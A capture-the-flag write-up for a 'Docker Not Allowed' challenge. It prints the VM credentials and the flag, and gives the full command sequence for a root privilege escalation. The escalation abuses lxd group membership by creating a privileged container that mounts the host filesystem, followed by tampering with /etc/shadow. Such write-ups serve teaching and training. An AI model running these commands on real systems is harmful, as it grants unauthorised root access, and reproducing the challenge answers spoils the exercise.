# Docker Not Allowed [misc]

## 問題概要

# Docker Not Allowed
I think I lost my privileges to run the file...

**Attachment**: https://drive.google.com/file/d/1gYlIyR23OFaOGnyJNzbItKL5PLopiZhk/view?usp=sharing

`difficulty: medium`

`Author: the_moon_guy`

## Flag
```
EH4X{sh0u1d_h4v3_ju5t_us3d_d0ck3r_1t_s33m5}
```

## Solution


## Making Challenge

---

## Writeup

# Docker Not Found Writeup

**Author:** `the_moon_guy`

The challenge handout contained a 7z file which was a VMware VM file.

The credentials given were:

`username: the_moon_guy` <br>
`password: asa`

When we login with these credentials, we get access to a low priviledged user, which cannot execute the `flag` file. The permissions of the files were set such that only root can execute it. 

So it was a privilege escalation challenge, we have to get access to the root without knowing the credentials.

This challenge was based on a LXD exploit in Ubuntu 18.04, which was the OS Version running on the VM.

The user was not in the `sudo` group but it was present in the `lxd` group, making him capable of running containers which can be used for priv esc.

For that you first needed to clone this repository: <br>
`https://github.com/saghul/lxd-alpine-builder.git`

This had the container build file for the exploit.
After that you needed to execute the following commands to setup and run the container.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder/

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias privesc

lxc init privesc privesc-container -c security.privileged=true

lxc config device add privesc-container exploitblizzard disk source=/ path=/mnt/root recursive=true

lxc start privesc-container

lxc exec privesc-container /bin/sh

lxd init

```

This would give you the root shell of the container. You can now either change the permissions of the file and execute it, or change the root password by messing with the `/etc/shadow` file. 

Executing the file gave away the flag: 
```
EH4X{sh0u1d_h4v3_ju5t_us3d_d0ck3r_1t_s33m5}
```